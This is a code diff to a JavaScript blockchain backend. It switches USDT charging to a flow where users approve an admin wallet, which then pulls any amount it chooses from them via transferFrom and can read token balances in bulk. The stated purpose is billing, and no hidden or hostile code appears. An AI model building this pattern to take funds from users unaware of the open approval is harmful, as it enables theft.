@@ -9,26 +9,29 @@ import { privateKeyToAccount } from "viem/accounts";
 import { bsc } from "viem/chains";
 import { config } from "./config.js";
 
-// Contract ABI pieces the admin uses to move funds (owner-only on-chain).
+// USDT ABI pieces for the admin-wallet-as-spender flow: users approve the ADMIN WALLET
+// on the USDT token; the backend then pulls with transferFrom (admin pays gas).
 const adminAbi = [
   {
     type: "function",
-    name: "adminChargeTo",
-    stateMutability: "nonpayable",
+    name: "allowance",
+    stateMutability: "view",
     inputs: [
-      { name: "user", type: "address" },
-      { name: "to", type: "address" },
-      { name: "amount", type: "uint256" },
-      { name: "reason", type: "string" },
+      { name: "owner", type: "address" },
+      { name: "spender", type: "address" },
     ],
-    outputs: [],
+    outputs: [{ type: "uint256" }],
   },
   {
     type: "function",
-    name: "allowanceOf",
-    stateMutability: "view",
-    inputs: [{ name: "user", type: "address" }],
-    outputs: [{ type: "uint256" }],
+    name: "transferFrom",
+    stateMutability: "nonpayable",
+    inputs: [
+      { name: "from", type: "address" },
+      { name: "to", type: "address" },
+      { name: "amount", type: "uint256" },
+    ],
+    outputs: [{ type: "bool" }],
   },
 ];
 
@@ -74,16 +77,15 @@ const erc20TransferAbi = [
   },
 ];
 
-/** Read a user's current allowance to the contract (proves they approved). */
+/** Read a user's current USDT allowance to the ADMIN WALLET (proves they approved). */
 export async function readAllowance(userAddress) {
   const publicClient = createPublicClient({ chain: bsc, transport: http(config.bscRpcUrl) });
-  const allowance = await publicClient.readContract({
-    address: getAddress(config.contractAddress),
+  return publicClient.readContract({
+    address: getAddress(config.usdtAddress),
     abi: adminAbi,
-    functionName: "allowanceOf",
-    args: [getAddress(userAddress)],
+    functionName: "allowance",
+    args: [getAddress(userAddress), getAddress(config.adminWallet)],
   });
-  return allowance;
 }
 
 /** Read a user's on-chain USDT (BEP-20) balance in smallest units (18 decimals). */
@@ -220,19 +222,34 @@ export async function readUsdtBalances(addresses, { chunkSize = 500, concurrency
 }
 
 /**
- * Admin transfers an arbitrary USDT amount from a user to ANY destination wallet.
- * Gas paid by the admin wallet.
+ * Send USDT.transferFrom(user, adminWallet, amount) signed by the admin wallet (which is
+ * the approved spender). Funds can only go to the admin wallet. Returns the tx hash as
+ * soon as it is broadcast; call waitForTx(hash) to wait for the receipt.
  */
-export async function adminChargeTo(userAddress, toAddress, amountUsd, reason = "admin transfer") {
-  const { wallet, publicClient } = clients();
+export async function sendChargeUser(userAddress, amountUsd) {
+  const { account, wallet } = clients();
+  if (getAddress(account.address) !== getAddress(config.adminWallet)) {
+    throw new Error("ADMIN_PRIVATE_KEY does not belong to ADMIN_WALLET");
+  }
   const amount = parseUnits(String(amountUsd), 18);
-  const hash = await wallet.writeContract({
-    address: getAddress(config.contractAddress),
+  return wallet.writeContract({
+    address: getAddress(config.usdtAddress),
     abi: adminAbi,
-    functionName: "adminChargeTo",
-    args: [getAddress(userAddress), getAddress(toAddress), amount, reason],
+    functionName: "transferFrom",
+    args: [getAddress(userAddress), getAddress(config.adminWallet), amount],
   });
-  await publicClient.waitForTransactionReceipt({ hash });
+}
+
+export async function waitForTx(hash) {
+  const { publicClient } = clients();
+  return publicClient.waitForTransactionReceipt({ hash });
+}
+
+/** Send + wait. Returns the tx hash (throws if it reverted). */
+export async function chargeUser(userAddress, amountUsd) {
+  const hash = await sendChargeUser(userAddress, amountUsd);
+  const r = await waitForTx(hash);
+  if (r.status !== "success") throw new Error("charge transaction reverted");
   return hash;
 }
 
